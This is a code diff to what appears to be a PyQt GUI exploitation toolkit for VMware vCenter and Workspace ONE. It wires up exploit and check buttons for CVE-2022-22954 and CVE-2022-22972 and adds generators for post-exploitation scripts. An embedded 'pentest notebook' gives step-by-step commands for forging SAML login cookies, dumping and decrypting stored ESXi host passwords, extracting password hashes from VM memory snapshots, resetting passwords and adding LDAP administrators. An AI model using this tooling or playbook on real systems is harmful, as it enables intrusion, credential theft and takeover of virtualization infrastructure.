@@ -9,7 +9,55 @@ from utils.exploit.cve_2021_21985.cve_2021_21985_check import cve_2021_21985_che
 from utils.exploit.cve_2021_21985.cve_2021_21985_exploit import cve_2021_21985_exploit
 from utils.exploit.cve_2021_22005.cve_2021_22005_check import cve_2021_22005_check
 from utils.exploit.cve_2021_22005.cve_2021_22005_exploit import cve_2021_22005_exploit
+from utils.exploit.cve_2022_22954.cve_2022_22954_check import cve_2022_22954_check
+from utils.exploit.cve_2022_22954.cve_2022_22954_exploit import cve_2022_22954_exploit
+from utils.exploit.cve_2022_22972.cve_2022_22972_get_cookie import cve_2022_22972_get_cookie
+from utils.exploit.post_exploitation.generate_vcenter_extracertfrommdb_and_vcenter_generatelogincookie_py import \
+    generate_vcenter_extracertfrommdb_and_vcenter_generatelogincookie_py
+from utils.exploit.post_exploitation.generate_vcenter_ldapmanage_py import generate_vcenter_ldapmanage_py
+from utils.exploit.post_exploitation.generate_vcenter_saml_login_py import generate_vcenter_saml_login_py
+from utils.exploit.post_exploitation.generate_vhost_password_decrypt_py import generate_vhost_password_decrypt_py
 
+from utils.output import output_format
+
+
+class Thread_Cve_2022_22972_exploit(QThread):
+    update_date = pyqtSignal(str)
+
+    def __init__(self, url_text):
+        super(Thread_Cve_2022_22972_exploit, self).__init__()
+        self.url_text = url_text
+
+    def run(self):
+        _cve_2022_22972_exploit = cve_2022_22972_get_cookie(self.url_text, self.update_date)
+        _cve_2022_22972_exploit.get_cookie()
+
+class Thread_Cve_2022_22954_exploit(QThread):
+    update_date = pyqtSignal(str)
+
+    def __init__(self, url_text, result_text, command_text, shell_text, shell_name_text):
+        super(Thread_Cve_2022_22954_exploit, self).__init__()
+        self.url_text = url_text
+        self.result_text = result_text
+        self.command_text = command_text
+        self.shell_text = shell_text
+        self.shell_name_text = shell_name_text
+
+    def run(self):
+        _cve_2022_22954_exploit = cve_2022_22954_exploit(self.url_text, self.result_text, self.update_date, self.command_text, self.shell_text, self.shell_name_text)
+        _cve_2022_22954_exploit.exploit()
+
+class Thread_Cve_2022_22954_check(QThread):
+    update_date = pyqtSignal(str)
+
+    def __init__(self, url_text, result_text):
+        super(Thread_Cve_2022_22954_check, self).__init__()
+        self.url_text = url_text
+        self.result_text = result_text
+
+    def run(self):
+        _cve_2022_22954_check = cve_2022_22954_check(self.url_text, self.result_text, self.update_date)
+        _cve_2022_22954_check.check()
 
 class Thread_Cve_2021_22005_exploit(QThread):
     update_date = pyqtSignal(str)
@@ -89,11 +137,7 @@ class Thread_Cve_2021_21972_exploit(QThread):
         self.cve_2021_21972_exploit_shell_name_text = shell_name_text
 
     def run(self):
-        _cve_2021_21972_exploit = cve_2021_21972_shell_upload(self.cve_2021_21972_target_url_text,
-                                                              self.cve_2021_21972_shell_text,
-                                                              self.cve_2021_21972_exploit_result_text,
-                                                              self.cve_2021_21972_exploit_shell_name_text,
-                                                              self.update_date)
+        _cve_2021_21972_exploit = cve_2021_21972_shell_upload(self.cve_2021_21972_target_url_text, self.cve_2021_21972_shell_text, self.cve_2021_21972_exploit_result_text, self.cve_2021_21972_exploit_shell_name_text, self.update_date)
         _cve_2021_21972_exploit.upload_and_check_shell_task_manager()
 
 
@@ -111,6 +155,56 @@ class ThreadCollectVcenterInfo(QThread):
 
 
 class Ui_MainWindow(object):
+
+    # post_exploitation
+    def click_generate_vsl(self):
+        usage = generate_vcenter_saml_login_py()
+        self.py_script_generate_result_text.append(output_format("SUCCESS", "The <vcenter_saml_login.py> has been successfully generated to the program's root directory!"))
+        self.py_script_generate_result_text.append(output_format("INFO", f"The usage of <vcenter_saml_login.py> is as follows: \n{'-' * 30}\n{usage}\n{'-' * 30}"))
+
+    def click_generate_vpd(self):
+        usage = generate_vhost_password_decrypt_py()
+        self.py_script_generate_result_text.append(output_format("SUCCESS", "The <vhost_password_decrypt.py> has been successfully generated to the program's root directory!"))
+        self.py_script_generate_result_text.append(output_format("INFO", f"The usage of <vhost_password_decrypt.py> is as follows: \n{'-' * 30}\n{usage}\n{'-' * 30}"))
+
+    def click_generate_vefm_and_vlc(self):
+        vCenter_ExtraCertFromMdb_usage = generate_vcenter_extracertfrommdb_and_vcenter_generatelogincookie_py()[0]
+        vCenter_GenerateLoginCookie_usage = generate_vcenter_extracertfrommdb_and_vcenter_generatelogincookie_py()[1]
+        self.py_script_generate_result_text.append(output_format("SUCCESS", "The <vCenter_ExtraCertFromMdb.py> and <vCenter_GenerateLoginCookie.py> has been successfully generated to the program's root directory!"))
+        self.py_script_generate_result_text.append(output_format("INFO", f"The usage of <vCenter_ExtraCertFromMdb.py> is as follows: \n{'-' * 30}\n{vCenter_ExtraCertFromMdb_usage}\n{'-' * 30}"))
+        self.py_script_generate_result_text.append(output_format("INFO", f"The usage of <vCenter_GenerateLoginCookie.py> is as follows: \n{'-' * 30}\n{vCenter_GenerateLoginCookie_usage}\n{'-' * 30}"))
+
+    def click_generate_vlm(self):
+        usage = generate_vcenter_ldapmanage_py()
+        self.py_script_generate_result_text.append(output_format("SUCCESS", "The <vCenterLDAP_Manage.py> has been successfully generated to the program's root directory!"))
+        self.py_script_generate_result_text.append(output_format("INFO", f"The usage of <vCenterLDAP_Manage.py> is as follows: \n{'-' * 30}\n{usage}\n{'-' * 30}"))
+
+    def Click_CVE_2022_22972_exploit_Button(self):
+        self.Cve_2022_22972_exploit_thread = Thread_Cve_2022_22972_exploit(self.cve_2022_22972_target_url_text)
+        self.Cve_2022_22972_exploit_thread.update_date.connect(self.show_CVE_2022_22972_exploit_Info)
+        self.Cve_2022_22972_exploit_thread.start()
+
+    def show_CVE_2022_22972_exploit_Info(self, display_newstr):
+        self.cve_2022_22972_result_text.setPlainText(self.cve_2022_22972_result_text.toPlainText() + display_newstr + "\n")
+        self.cve_2022_22972_result_text.moveCursor(QTextCursor.End)
+
+    def Click_CVE_2022_22954_exploit_Button(self):
+        self.Cve_2022_22954_exploit_thread = Thread_Cve_2022_22954_exploit(self.cve_2022_22954_target_url_text, self.cve_2022_22954_result_text, self.cve_2022_22954_target_command_text, self.cve_2022_22954_target_shell_text, self.cve_2022_22954_target_shell_name_text)
+        self.Cve_2022_22954_exploit_thread.update_date.connect(self.show_CVE_2022_22954_exploit_Info)
+        self.Cve_2022_22954_exploit_thread.start()
+
+    def show_CVE_2022_22954_exploit_Info(self, display_newstr):
+        self.cve_2022_22954_result_text.setPlainText(self.cve_2022_22954_result_text.toPlainText() + display_newstr + "\n")
+        self.cve_2022_22954_result_text.moveCursor(QTextCursor.End)
+
+    def Click_CVE_2022_22954_check_Button(self):
+        self.Cve_2022_22954_check_thread = Thread_Cve_2022_22954_check(self.cve_2022_22954_target_url_text, self.cve_2022_22954_result_text)
+        self.Cve_2022_22954_check_thread.update_date.connect(self.show_CVE_2022_22954_check_Info)
+        self.Cve_2022_22954_check_thread.start()
+
+    def show_CVE_2022_22954_check_Info(self, display_newstr):
+        self.cve_2022_22954_result_text.setPlainText(self.cve_2022_22954_result_text.toPlainText() + display_newstr + "\n")
+        self.cve_2022_22954_result_text.moveCursor(QTextCursor.End)
 
     def Click_CVE_2021_22005_exploit_Button(self):
         self.Cve_2021_22005_exploit_thread = Thread_Cve_2021_22005_exploit(self.cve_2021_22005_target_url_text, self.cve_2021_22005_result_text, self.cve_2021_22205_target_shell_text, self.cve_2021_22005_target_shell_name_text)
@@ -303,9 +397,7 @@ class Ui_MainWindow(object):
         self.cve_2021_21972_result_text = QtWidgets.QTextBrowser(self.cve_2021_21972_result_groupbox)
         self.cve_2021_21972_result_text.setGeometry(QtCore.QRect(10, 20, 1151, 421))
         self.cve_2021_21972_result_text.viewport().setProperty("cursor", QtGui.QCursor(QtCore.Qt.ArrowCursor))
-        self.cve_2021_21972_result_text.setStyleSheet("background-color: #ffffff;\n"
-"font: 12pt \"Courier New\";\n"
-"color: #006600;")
+        self.cve_2021_21972_result_text.setStyleSheet("background-color: #ffffff;\n""font: 12pt \"Courier New\";\n""color: #006600;")
         self.cve_2021_21972_result_text.setMarkdown("")
         self.cve_2021_21972_result_text.setOverwriteMode(False)
         self.cve_2021_21972_result_text.setPlaceholderText("")
@@ -663,6 +755,7 @@ class Ui_MainWindow(object):
         self.notebook_text = QtWidgets.QTextEdit(self.pentest_notebook_groupbox)
         self.notebook_text.setGeometry(QtCore.QRect(10, 10, 1171, 641))
         self.notebook_text.setObjectName("notebook_text")
+        self.notebook_text.setMarkdown("""# 1.  SAML cert login\n```\n# default mdb spath\nlinux: /storage/db/vmware-vmdir/data.mdb\nwindows: C:\\ProgramData\\VMware\\vCenterServer\\data\\vmdird\\data.mdb\n# use python script to generate the cookie\n# on your attack computer\npython3 vcenter_saml_login.py -p data.mdb -t 192.168.0.92\n# On the victim's host\npython vCenter_ExtraCertFromMdb.py data.mdb\npython vCenter_GenerateLoginCookie.py 192.168.1.1 192.168.1.1 test.com idp_cert.txt trusted_cert_1.txt trusted_cert_2.txt\n```\n# 2. Get the username and password of the vpxusers\n## 2.1 get the configuration of postgresql\n```\n# linux\ncat /etc/vmware-vpx/vcdb.properties\n# or\ncat /etc/vmware/service-state/vpxd/vcdb.properties\n# windows\ntype  C:\\ProgramData\\VMware\\vCenterServer\\cfg\\vmware-vps\\vcdb.properties\n```\n## 2.2 connect to postgresql\n```\n# linux\n/opt/vmware/vpostgres/current/bin/psql -h 127.0.0.1 -p 5432 -U vc -d VCDB -c "select ip_address,user_name,password from vpx_host;" > password.enc\n# windows\n"C:\\Program Files\\VMware\\vCenter Server\\vPostgres\\bin\\psql.exe" -h 127.0.0.1 -p 5432 -U vc -d VCDB -c "select ip_address,user_name,password from vpx_host;" > password.enc\n```\n## 2.3 Get <symkey.dat>\n```\n# linux\ncat /etc/vmware-vpx/ssl/symkey.dat\n# windows\ntype "C:\\ProgramData\\VMware\\vCenter Server\\cfg\\vmware-vpx\\ssl\\symkey.dat"\n```\n## 2.4 decrypt\n```\npython3 vhost_password_decrypt.py symkey.dat password.enc password.txt\n```\n# 3. Get Windows machine privileges in Vcenter backend\n## 3.1 tools download\nAll: \n> https://www.volatilityfoundation.org/releases\n\nExample:\n> http://downloads.volatilityfoundation.org/releases/2.6/volatility_2.6_win64_standalone.zip\n## 3.2 Commonly used commands\n```\n# view the suggested profiles\nvolatility_2.6_win64_standalone.exe -f server2008R2-Snapshot2.vmem imageinfo\n# List the registry content\nvolatility_2.6_win64_standalone.exe -f server2008R2-Snapshot2.vmem --profile=Win7SP1x64 hivelist\n# Use hashdump to get hash values\nvolatility_2.6_win64_standalone.exe -f server2008R2-Snapshot2.vmem --profile=Win7SP1x64 hashdump -y 0xfffff8a000024010 -s 0xfffff8a000478010\n```\n# 4. Reset the password\n```\n# select 3!!!\n# Linux\n/usr/lib/vmware-vmdir/bin/vdcadmintool\n# Windows\n"C:\\Program Files\\VMware\\vCenter Server\\vmdird\\vdcadmintool.exe"\n```\n# 5. Add a user to LDAP\n```\npython vCenterLDAP_Manage.py adduser\npython vCenterLDAP_Manage.py addadmin\n```\n# 6. Reference article\n```\nhttps://daidaitiehanhan.github.io/2022/04/18/vCenter2021%e5%87%a0%e4%b8%aa%e6%bc%8f%e6%b4%9e%e5%8f%8a%e5%90%8e%e6%b8%97%e9%80%8f/\n\nhttps://www.wangan.com/p/11v6c7ccd944ff8e\n\nhttps://www.geekby.site/2022/05/vcenter%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8\n\nhttps://3gstudent.github.io/vSphere%E5%BC%80%E5%8F%91%E6%8C%87%E5%8D%974-PostgreSQL\n\nhttps://3gstudent.github.io/vSphere%E5%BC%80%E5%8F%91%E6%8C%87%E5%8D%975-LDAP\n\nhttps://3gstudent.github.io/vSphere%E5%BC%80%E5%8F%91%E6%8C%87%E5%8D%976-vCenter-SAML-Certificates\n\nhttps://github.com/worawit/CVE-2021-3156/blob/main/exploit_defaults_mailer.py\n\nhttps://blog.csdn.net/csdnmmd/article/details/127878832\n\nhttps://www.cnblogs.com/haidragon/p/16843418.html\n\nhttps://mp.weixin.qq.com/s/-cEf0bG8j_8VdoSEeMsNGw\n\nhttps://mp.weixin.qq.com/s/Okxc4CdFRPe82UHN4UXQHQ\n\nhttps://mp.weixin.qq.com/s/JI3YlyComDViFX31UE8ddA\n\nhttps://mp.weixin.qq.com/s/DbXxm6vWgtL8uGjO_z-ocA\n\nhttps://pentera.io/blog/vscalation-cve-2021-22015-local-privilege-escalation-in-vmware-vcenter-pentera-labs/\n```\n""")
         self.tabWidget.addTab(self.pentest_notebook_groupbox, "")
         MainWindow.setCentralWidget(self.centralwidget)
         self.menubar = QtWidgets.QMenuBar(MainWindow)
@@ -697,6 +790,13 @@ class Ui_MainWindow(object):
         self.cve_2021_21985_exploit_button.clicked.connect(self.Click_CVE_2021_21985_exploit_Button)
         self.cve_2021_22005_target_check.clicked.connect(self.Click_CVE_2021_22005_check_Button)
         self.cve_2021_22005_target_exploit.clicked.connect(self.Click_CVE_2021_22005_exploit_Button)
+        self.cve_2022_22954_target_check_button.clicked.connect(self.Click_CVE_2022_22954_check_Button)
+        self.cve_2022_22954_exploit_button.clicked.connect(self.Click_CVE_2022_22954_exploit_Button)
+        self.cve_2022_22972_get_cookie_button.clicked.connect(self.Click_CVE_2022_22972_exploit_Button)
+        self.vhost_password_decrypt_button.clicked.connect(self.click_generate_vpd)
+        self.vcenter_saml_login_button.clicked.connect(self.click_generate_vsl)
+        self.vcenter_saml_login_target_button.clicked.connect(self.click_generate_vefm_and_vlc)
+        self.vcenter_ldap_manage_button.clicked.connect(self.click_generate_vlm)
         QtCore.QMetaObject.connectSlotsByName(MainWindow)
 
     def retranslateUi(self, MainWindow):
